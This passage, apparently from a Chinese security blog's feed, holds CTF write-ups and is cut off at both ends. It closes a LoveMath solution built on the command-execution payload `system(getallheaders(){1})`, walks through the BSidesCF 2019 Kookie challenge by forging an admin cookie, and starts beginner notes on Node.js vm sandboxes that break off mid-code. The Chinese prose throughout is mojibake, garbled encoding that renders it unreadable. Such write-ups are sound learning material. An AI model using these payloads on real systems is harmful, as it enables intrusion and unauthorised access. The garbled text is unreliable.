)ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">Warning<br>ç”±äºä½¿ç”¨å†…éƒ¨çš„ â€œdoubleâ€ æˆ– â€œ<span class="hljs-attribute">float</span>â€ ç±»å‹ï¼Œ<span class="hljs-built_in">base_convert</span>() çš„æ“ä½œå¯èƒ½ä¼šå¯¼è‡´å¤§æ•°å€¼ä¸­çš„ç²¾åº¦ä¸¢å¤±ã€‚è¯·å‚è§æœ¬æ‰‹å†Œçš„ æµ®ç‚¹æ•° ç« èŠ‚ä»¥ä¾¿è·å¾—æ›´å¤šè¯¦ç»†ä¿¡æ¯ã€‚<br><br>ç»è¿‡å¤§å¸ˆçˆ¶ä»¬çš„æµ‹è¯•ï¼Œ<span class="hljs-number">31</span>-<span class="hljs-number">36</span>è¿›åˆ¶çš„getallheaderséƒ½ä¼šå‡ºç°ç²¾åº¦ä¸¢å¤±å¯¼è‡´ä¸èƒ½æˆåŠŸå¾—åˆ°getallheadersï¼Œ<span class="hljs-number">30</span>è¿›åˆ¶çš„æ—¶å€™å°±å¯ä»¥äº†ã€‚<br></code></pre></td></tr></table></figure><p><code>system(getallheaders()&#123;1&#125;)</code>ï¼Œè¿™ä¸ª<code>&#123;1&#125;</code>åº”è¯¥æ˜¯è·å–åŒ…å¤´ä¸º<code>1</code>éƒ¨åˆ†çš„å€¼ï¼Œæˆ‘è¯´<code>åº”è¯¥</code>æ˜¯å› ä¸ºæ²¡æ‰¾åˆ°ç›¸å…³æ–‡ç« è¯´è¿™ä¸ªä¸œè¥¿ã€‚ã€‚å¤§å¤šç›´æ¥ç»™äº†<code>payload</code>(ä¼°è®¡å¸ˆå‚…ä»¬è§‰å¾—è¿™é—®é¢˜æ²¡å¿…è¦è¯´ï¼Œå“ˆå“ˆ)ã€‚æˆ‘è‡ªå·±å°è¯•æŠŠ<code>1</code>æ”¹æˆåˆ«çš„å†æ”¹å¯¹åº”åŒ…å¤´ä¹Ÿèƒ½æ‰§è¡Œå‘½ä»¤(æˆ‘è¿™é‡Œæ”¹æˆäº†<code>333</code>)ï¼š</p><p><img src="/img/lovemath1.png" alt="lovemath1"></p><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p><img src="/img/kookie1.png" alt="kookie1"></p><p>è®©æˆ‘ä»¬ä»¥<code>admin</code>çš„èº«ä»½ç™»å½•ï¼Œç„¶åæç¤ºå·²ç»æœ‰<code>cookie/monster</code>è¿™ä¸¤ä¸ªè´¦æˆ·äº†ï¼Œé€‰<code>cookie</code>è¿™ä¸ªç”¨æˆ·åå†éšä¾¿è¾“ä¸ªå¯†ç ç™»å½•ä¸€ä¸‹çœ‹çœ‹ï¼š</p><p><img src="/img/kookie2.png" alt="kookie2"></p><p>å¯ä»¥çœ‹åˆ°è¡Œä¸º&#x2F;ç”¨æˆ·å&#x2F;å¯†ç éƒ½æ˜¯ç›´æ¥ä»¥<code>GET</code>æ–¹å¼ä¼ è¿‡å»çš„(æºç ä¹Ÿæœ‰ç›¸åº”æç¤º)ï¼Œé‚£æˆ‘ä»¬ç›´æ¥æŠŠ<code>username</code>åé¢çš„ä¸œè¥¿åˆ æ‰çœ‹çœ‹èƒ½å¦ç™»å½•ï¼š</p><p><code>/?action=login&amp;username=cookie</code></p><p>è¿™ä¸ªç™»ä¸ä¸Šå»ï¼Œæ¢<code>monster</code>è¯•è¯•ï¼š</p><p><code>/?action=login&amp;username=monster</code></p><p>ç™»å½•æˆåŠŸï¼š</p><p><img src="/img/kookie4.png" alt="kookie4"></p><p>æŠ“åŒ…çœ‹çœ‹<code>cookie</code>:</p><p><img src="/img/kookie5.png" alt="kookie5"></p><p>å‘ç°<code>cookie</code>å­—æ®µä¸­<code>username=monster</code>ï¼Œç›´æ¥æ”¹æˆ<code>admin</code>:</p><p><img src="/img/kookie6.png" alt="kookie6"></p><p>åº”è¯¥æ˜¯æ–°ç”Ÿèµ›çš„é¢˜ç›®</p>]]></content>
    
    
    
    <tags>
      
      <tag>åšé¢˜è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆè¯†vmæ²™ç®±é€ƒé€¸</title>
    <link href="/2023/10/24/VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/10/24/VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>åˆå­¦è€…çš„å­¦ä¹ ç¬”è®°ï¼Œæ²¡å•¥å«é‡‘é‡ã€‚</p><span id="more"></span><hr><h3 id="0x01-åŸºç¡€çŸ¥è¯†"><a href="#0x01-åŸºç¡€çŸ¥è¯†" class="headerlink" title="0x01 åŸºç¡€çŸ¥è¯†"></a>0x01 åŸºç¡€çŸ¥è¯†</h3><p><code>JavaScript</code>å’Œ<code>Nodejs</code>ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</p><p>ç®€å•è¯´å°±æ˜¯<code>JavaScript</code>ç”¨äºæµè§ˆå™¨å‰ç«¯ï¼Œ<code>Nodejs</code>ç”¨åœ¨åç«¯(æœåŠ¡å™¨)ã€‚</p><p>ä»€ä¹ˆæ˜¯æ²™ç®±(<code>sandbox</code>)ï¼Ÿ</p><p>ç”¨äºéš”ç¦»æ¶æ„ä»£ç çš„ç¯å¢ƒï¼Œæ¶æ„ä»£ç å³ä½¿åœ¨æ²™ç®±ä¸­è¢«æ‰§è¡Œä¹Ÿæ²¡å¤šå¤§å±å®³ã€‚</p><p>åœ¨<code>Nodejs</code>ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¼•å…¥<code>vm</code>æ¨¡å—æ¥åˆ›å»ºä¸€ä¸ªâ€œæ²™ç®±â€ï¼Œä½†å…¶å®è¿™ä¸ª<code>vm</code>æ¨¡å—çš„éš”ç¦»åŠŸèƒ½å¹¶ä¸å®Œå–„ï¼Œè¿˜æœ‰å¾ˆå¤šç¼ºé™·ï¼Œå› æ­¤<code>Node</code>åç»­å‡çº§äº†<code>vm</code>ï¼Œä¹Ÿå°±æ˜¯ç°åœ¨çš„<code>vm2</code>æ²™ç®±ï¼Œ<code>vm2</code>å¼•ç”¨äº†<code>vm</code>æ¨¡å—çš„åŠŸèƒ½ï¼Œå¹¶åœ¨å…¶åŸºç¡€ä¸Šåšäº†ä¸€äº›ä¼˜åŒ–ã€‚</p><h3 id="0x02-Nodeå¯ä»¥æŠŠå­—ç¬¦ä¸²å½“ä»£ç æ‰§è¡Œ"><a href="#0x02-Nodeå¯ä»¥æŠŠå­—ç¬¦ä¸²å½“ä»£ç æ‰§è¡Œ" class="headerlink" title="0x02 Nodeå¯ä»¥æŠŠå­—ç¬¦ä¸²å½“ä»£ç æ‰§è¡Œ"></a>0x02 Nodeå¯ä»¥æŠŠå­—ç¬¦ä¸²å½“ä»£ç æ‰§è¡Œ</h3><p>ç”¨ä¸€äº›å‚è€ƒæ–‡ç« ä¸­çš„æ —å­(åœ¨<code>.js</code>æ‰€åœ¨ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª<code>age.txt</code>)ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var age <span class="hljs-operator">=</span> <span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><p>åˆ›å»º<code>hello,js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>) <span class="hljs-comment">//requireå‡½æ•°å¼•å…¥Node.jsçš„fsæ¨¡å—ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™å¸¸é‡fs</span><br><br><span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;age.txt&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-comment">//ä½¿ç”¨fsæ¨¡å—çš„readFileSyncæ–¹æ³•åŒæ­¥è¯»å–åä¸ºage.txtçš„æ–‡ä»¶ï¼Œå¹¶å°†æ–‡ä»¶å†…å®¹ä»¥UTF-8ç¼–ç çš„å½¢å¼å­˜å‚¨åœ¨contentå˜é‡ä¸­ã€‚</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(content)<span class="hljs-comment">//æ‰“å°content</span><br><br><span class="hljs-built_in">eval</span>(content)<span class="hljs-comment">//æ‰§è¡Œï¼</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)<span class="hljs-comment">//æ‰“å°age</span><br></code></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var age <span class="hljs-operator">=</span> <span class="hljs-number">18</span><br><span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><p><code>age.txt</code>ä¸­çš„<code>var age = 18</code>è¢«å½“æˆå­—ç¬¦ä¸²æ‰§è¡Œäº†ã€‚</p><p>ä¸è¿‡è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼šå¦‚æœåœ¨å½“å‰ä½œç”¨åŸŸ(ä¹Ÿå«ä¸Šä¸‹æ–‡)ä¸‹å·²ç»æœ‰äº†ä¸ª<code>age</code>ï¼Œé‚£ä¹ˆä¼šæŠ¥é”™ã€‚ä¸¾ä¸ªæ —å­:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><br><span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;age.txt&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-keyword">let</span> age = <span class="hljs-number">12</span> <br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(content)<br><br><span class="hljs-built_in">eval</span>(content)<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)<br><span class="hljs-comment">//ç»“æœï¼š</span><br><span class="hljs-keyword">var</span> age = <span class="hljs-number">18</span><br><span class="hljs-attr">undefined</span>:<span class="hljs-number">1</span><br><span class="hljs-keyword">var</span> age = <span class="hljs-number">18</span><br>    ^<br><br><span class="hljs-title class_">SyntaxError</span>: <span class="hljs-title class_">Identifier</span> <span class="hljs-string">&#x27;age&#x27;</span> has already been declared<br></code></pre></td></tr></table></figure><p>ä½œç”¨åŸŸæ˜¯ä»€ä¹ˆï¼Ÿä¸¾ä¸ªæ —å­ï¼š</p><p><code>bye.js</code>:</p><p><code>var age = 20</code></p><p><code>hello.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./bye&quot;</span>) <span class="hljs-comment">//requireå‡½æ•°å¼•å…¥äº†å½“å‰ç›®å½•ä¸‹çš„åä¸ºbyeçš„æ¨¡å—ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™å¸¸é‡a</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">age</span>)<br><br><span class="hljs-comment">//ç»“æœï¼š</span><br><span class="hljs-literal">undefined</span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚ä½•åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å¼•å…¥å½“å‰ç›®å½•ä¸‹ï¼Œå¦ä¸€ä¸ªæ–‡ä»¶ä¸­çš„å…ƒç´ ï¼Ÿå¯ä»¥åˆ©ç”¨<code>exports</code>æ¥å£è¾¾åˆ°ç›®çš„ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//bye.js</span><br><br><span class="hljs-keyword">var</span> age = <span class="hljs-number">20</span><br><br><span class="hljs-built_in">exports</span>.<span class="hljs-property">age</span> = age<span class="hljs-comment">//exportsæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å¯¹è±¡ï¼Œç”¨äºå°†æ¨¡å—ä¸­çš„å˜é‡ã€å‡½æ•°æˆ–å¯¹è±¡æš´éœ²ç»™å…¶ä»–æ¨¡å—ä½¿ç”¨</span><br></code></pre></td></tr></table></figure><p><code>hello.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./bye&quot;</span>) <br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">age</span>)<br><br><span class="hljs-comment">//20</span><br></code></pre></td></tr></table></figure><p>è‹¥æ²¡æœ‰exportså°†éœ€è¦çš„å±æ€§æš´éœ²å‡ºæ¥ï¼Œæˆ‘ä»¬æ˜¯è®¿é—®ä¸åˆ°å¦ä¸€ä¸ªåŒ…å†…çš„å±æ€§çš„ã€‚åŒ…ä¸åŒ…ä¹‹é—´æ˜¯äº’ä¸ç›¸é€šçš„ï¼Œå³<code>æ¯ä¸€ä¸ªåŒ…éƒ½æœ‰è‡ªå·±çš„ä½œç”¨åŸŸ</code>ã€‚</p><p><img src="/img/vvv1.png" alt="vvv1"></p><p>(è¿™å¼ å›¾ä»åˆ«äººé‚£é‡Œå·çš„<code>y1</code>&#x3D;<code>bye</code>,<code>y2</code>&#x3D;<code>hello</code>)</p><p><code>global</code>æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>åœ¨Node.jsä¸­ï¼Œ<code>global</code>æ˜¯ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼Œç±»ä¼¼äºæµè§ˆå™¨ç¯å¢ƒä¸­çš„<code>window</code>å¯¹è±¡ã€‚å®ƒå¯ä»¥åœ¨ä»»ä½•åœ°æ–¹è®¿é—®ï¼Œæ— éœ€å¼•å…¥æˆ–å£°æ˜ã€‚</p><p><code>global</code>å¯¹è±¡åŒ…å«äº†Node.jsä¸­çš„å…¨å±€å˜é‡å’Œå…¨å±€å‡½æ•°ã€‚ä¾‹å¦‚ï¼Œ<code>console</code>ã€<code>setTimeout</code>ã€<code>setInterval</code>ç­‰å‡½æ•°éƒ½æ˜¯<code>global</code>å¯¹è±¡çš„å±æ€§ã€‚å¯ä»¥é€šè¿‡<code>global</code>å¯¹è±¡æ¥è®¿é—®è¿™äº›å…¨å±€å‡½æ•°å’Œå˜é‡ã€‚</p><p>åœ¨Node.jsä¸­ï¼Œ<code>global</code>å¯¹è±¡è¿˜å¯ä»¥ç”¨æ¥åˆ›å»ºå…¨å±€å˜é‡ã€‚ä½†æ˜¯ï¼Œä¸ºäº†é¿å…å…¨å±€å˜é‡çš„æ»¥ç”¨ï¼Œé€šå¸¸ä¸æ¨èä½¿ç”¨å…¨å±€å˜é‡ï¼Œè€Œæ˜¯ä½¿ç”¨æ¨¡å—çš„å¯¼å‡ºå’Œå¯¼å…¥æœºåˆ¶æ¥è¿›è¡Œå˜é‡çš„å…±äº«å’Œè®¿é—®ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬åœ¨ç”¨<code>console.log</code>è¾“å‡ºæ—¶å¹¶ä¸éœ€è¦å†™æˆ<code>global.console.log</code>ï¼Œå…¶ä»–å¸¸è§å…¨å±€å˜é‡è¿˜æœ‰processï¼ˆä¸€ä¼šé€ƒé€¸è¦ç”¨åˆ°ï¼‰ã€‚</p><p>çœ‹ä¸€ä¸ªæœ‰å…³å…¨å±€å˜é‡çš„æ —å­ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//bye.js</span><br><span class="hljs-variable language_">global</span>.<span class="hljs-property">age</span> = <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//hello.js</span><br><span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./bye&quot;</span>)<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)<br><br><span class="hljs-comment">//è¾“å‡ºï¼š</span><br><br><span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>è¿™æ¬¡æˆ‘å¹¶æ²¡æœ‰åˆ©ç”¨<code>exports</code>å¯¼å…¥<code>age</code>ï¼Œä½†<code>hello.js</code>ç¡®å®è®¿é—®äº†å¦ä¸€ä¸ªåŒ…çš„å±æ€§ã€‚</p><p>æ­¤å¤–ï¼Œè¿˜æœ‰ä¸€ç§æ–¹æ³•<code>new Function</code>:</p><p>åœ¨Node.jsä¸­ï¼Œ<code>new Function</code>æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªæ–°çš„å‡½æ•°å¯¹è±¡ã€‚å®ƒæ¥å—ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œå…¶ä¸­æœ€åä¸€ä¸ªå‚æ•°æ˜¯å‡½æ•°ä½“ï¼Œå‰é¢çš„å‚æ•°æ˜¯å‡½æ•°çš„å‚æ•°åˆ—è¡¨ã€‚</p><p>ä½¿ç”¨<code>new Function</code>æ„é€ å‡½æ•°å¯ä»¥åŠ¨æ€åœ°åˆ›å»ºä¸€ä¸ªå‡½æ•°å¯¹è±¡ï¼Œè€Œä¸éœ€è¦æå‰å®šä¹‰å‡½æ•°çš„åç§°æˆ–å‡½æ•°ä½“ã€‚è¿™ç§æ–¹å¼å¯ä»¥åœ¨è¿è¡Œæ—¶æ ¹æ®éœ€è¦åˆ›å»ºå‡½æ•°ï¼Œå…·æœ‰ä¸€å®šçš„çµæ´»æ€§ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> add = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;return a + b;&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)); <span class="hljs-comment">// è¾“å‡º: 5</span><br></code></pre></td></tr></table></figure><h3 id="0x03vmæ²™ç®±"><a href="#0x03vmæ²™ç®±" class="headerlink" title="0x03vmæ²™ç®±"></a>0x03vmæ²™ç®±</h3><p>å› ä¸ºæ²™ç®±çš„ç›®çš„æ˜¯è¦éš”ç¦»æ¶æ„ä»£ç ï¼Œé‚£æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»ºæ–°ä½œç”¨åŸŸå¹¶è®©æ¶æ„ä»£ç åœ¨å…¶ä¸­è¿è¡Œè€Œä¸å½±å“å…¶å®ƒä½œç”¨åŸŸï¼Œçœ‹å‡ ä¸ªå¸¸ç”¨çš„vmæ¨¡å—çš„APIï¼š</p><p><code>vm.runinThisContext(code)</code>:åœ¨å½“å‰globalä¸‹åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼ˆsandboxï¼‰ï¼Œå¹¶å°†æ¥æ”¶åˆ°çš„å‚æ•°å½“ä½œä»£ç è¿è¡Œã€‚sandboxä¸­å¯ä»¥è®¿é—®åˆ°globalä¸­çš„å±æ€§ï¼Œä½†æ— æ³•è®¿é—®å…¶ä»–åŒ…ä¸­çš„å±æ€§ã€‚</p><p><img src="/img/vvv2.png" alt="vvv2"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<span class="hljs-comment">//å¯¼å…¥Node,jsçš„vmæ¨¡å—</span><br><span class="hljs-keyword">let</span> localVar = <span class="hljs-string">&#x27;initial value&#x27;</span>;<span class="hljs-comment">//å®šä¹‰å˜é‡localVarï¼Œèµ‹å€¼initial value</span><br><span class="hljs-keyword">const</span> vmResult = vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;localVar = &quot;vm&quot;;&#x27;</span>);<span class="hljs-comment">//ä½¿ç”¨vm.runInThisContextæ–¹æ³•åœ¨å½“å‰ä¸Šä¸‹æ–‡ä¸­è¿è¡Œæä¾›çš„ä»£ç å­—ç¬¦ä¸²&#x27;localVar = &quot;vm&quot;;&#x27;ã€‚è¯¥ä»£ç çš„ä½œç”¨æ˜¯å°†å˜é‡localVarçš„å€¼ä¿®æ”¹ä¸º&#x27;vm&#x27;ã€‚</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;vmResult:&#x27;</span>, vmResult);<span class="hljs-comment">//è¾“å‡º</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;localVar:&#x27;</span>, localVar);<br><span class="hljs-comment">// vmResult: &#x27;vm&#x27;, </span><br><span class="hljs-comment">//localVar: &#x27;initial value&#x27;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æ²™ç®±ä¸­æŠŠå­—ç¬¦ä¸²å½“ä»£ç æ‰§è¡Œ<code>&#39;localVar = &quot;vm&quot;;&#39;</code>ï¼Œåªå½±å“æ²™ç®±è¿™ä¸ªä½œç”¨åŸŸï¼Œå¯¹å…¶å®ƒä½œç”¨åŸŸæ²¡å½±å“ã€‚</p><p><code>vm.createContext([sandbox])</code>ï¼š åœ¨ä½¿ç”¨å‰éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªæ²™ç®±å¯¹è±¡ï¼Œå†å°†æ²™ç®±å¯¹è±¡ä¼ ç»™è¯¥æ–¹æ³•ï¼ˆå¦‚æœæ²¡æœ‰åˆ™ä¼šç”Ÿæˆä¸€ä¸ªç©ºçš„æ²™ç®±å¯¹è±¡ï¼‰ï¼Œv8ä¸ºè¿™ä¸ªæ²™ç®±å¯¹è±¡åœ¨å½“å‰global<strong>å¤–</strong>å†åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼Œæ­¤æ—¶è¿™ä¸ªæ²™ç®±å¯¹è±¡å°±æ˜¯è¿™ä¸ªä½œç”¨åŸŸçš„å…¨å±€å¯¹è±¡ï¼Œæ²™ç®±å†…éƒ¨æ— æ³•è®¿é—®globalä¸­çš„å±æ€§ã€‚</p><p><code>vm.runInContext(code, contextifiedSandbox[, options])</code>ï¼šå‚æ•°ä¸ºè¦æ‰§è¡Œçš„ä»£ç å’Œåˆ›å»ºå®Œä½œç”¨åŸŸçš„æ²™ç®±å¯¹è±¡ï¼Œä»£ç ä¼šåœ¨ä¼ å…¥çš„æ²™ç®±å¯¹è±¡çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¹¶ä¸”å‚æ•°çš„å€¼ä¸æ²™ç®±å†…çš„å‚æ•°å€¼ç›¸åŒã€‚</p><p><img src="/img/vvv3.png" alt="vvv3"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<span class="hljs-comment">//å¯¼å…¥utilä»¥ä½¿ç”¨inspectæ–¹æ³•è¾“å‡ºè¯¦ç»†ä¿¡æ¯</span><br>  <span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br>  <span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span> = <span class="hljs-number">3</span>;<span class="hljs-comment">//å…¨å±€ç¯å¢ƒä¸­å®šä¹‰ä¸€ä¸ªå…¨å±€å˜é‡globalVarï¼Œå¹¶èµ‹å€¼ä¸º3</span><br>  <span class="hljs-keyword">const</span> sandbox = &#123; <span class="hljs-attr">globalVar</span>: <span class="hljs-number">1</span> &#125;;<span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ²™ç®±å¯¹è±¡sandboxï¼Œå…¶ä¸­å®šä¹‰äº†ä¸€ä¸ªåä¸ºglobalVarçš„å±æ€§ï¼Œå¹¶èµ‹å€¼ä¸º1</span><br>  vm.<span class="hljs-title function_">createContext</span>(sandbox);<span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ²™ç®±ä¸Šä¸‹æ–‡ï¼Œå°†æ²™ç®±å¯¹è±¡sandboxä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œä»¥ä¾¿åœ¨æ²™ç®±ä¸­æ‰§è¡Œä»£ç ã€‚</span><br>  vm.<span class="hljs-title function_">runInContext</span>(<span class="hljs-string">&#x27;globalVar *= 2;&#x27;</span>, sandbox);<span class="hljs-comment">//ä½¿ç”¨vm.runInContextæ–¹æ³•åœ¨æŒ‡å®šçš„æ²™ç®±ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»£ç å­—ç¬¦ä¸²&#x27;globalVar *= 2;&#x27;ã€‚è¯¥ä»£ç çš„ä½œç”¨æ˜¯å°†æ²™ç®±ä¸­çš„globalVarçš„å€¼ä¹˜ä»¥2</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(sandbox)); <span class="hljs-comment">// &#123; globalVar: 2 &#125;</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(globalVar)); <span class="hljs-comment">// 3</span><br><span class="hljs-comment">//æ²™ç®±å†…æ— æ³•å¯¹globalæœ‰ä»»ä½•å½±å“</span><br></code></pre></td></tr></table></figure><p><code>vm.runInNewContext(code[, sandbox][, options])</code>: creatContextå’ŒrunInContextçš„ç»“åˆç‰ˆï¼Œä¼ å…¥è¦æ‰§è¡Œçš„ä»£ç å’Œæ²™ç®±å¯¹è±¡ã€‚</p><p><code>vm.Scriptç±»</code> vm.Scriptç±»å‹çš„å®ä¾‹åŒ…å«è‹¥å¹²é¢„ç¼–è¯‘çš„è„šæœ¬ï¼Œè¿™äº›è„šæœ¬èƒ½å¤Ÿåœ¨ç‰¹å®šçš„æ²™ç®±ï¼ˆæˆ–è€…ä¸Šä¸‹æ–‡ï¼‰ä¸­è¢«è¿è¡Œã€‚</p><p><code>new vm.Script(code, options)</code>ï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„vm.Scriptå¯¹è±¡åªç¼–è¯‘ä»£ç ä½†ä¸ä¼šæ‰§è¡Œå®ƒã€‚ç¼–è¯‘è¿‡çš„vm.Scriptæ­¤åå¯ä»¥è¢«å¤šæ¬¡æ‰§è¡Œã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œcodeæ˜¯ä¸ç»‘å®šäºä»»ä½•å…¨å±€å¯¹è±¡çš„ï¼Œç›¸åï¼Œå®ƒä»…ä»…ç»‘å®šäºæ¯æ¬¡æ‰§è¡Œå®ƒçš„å¯¹è±¡ã€‚<br> codeï¼šè¦è¢«è§£æçš„JavaScriptä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 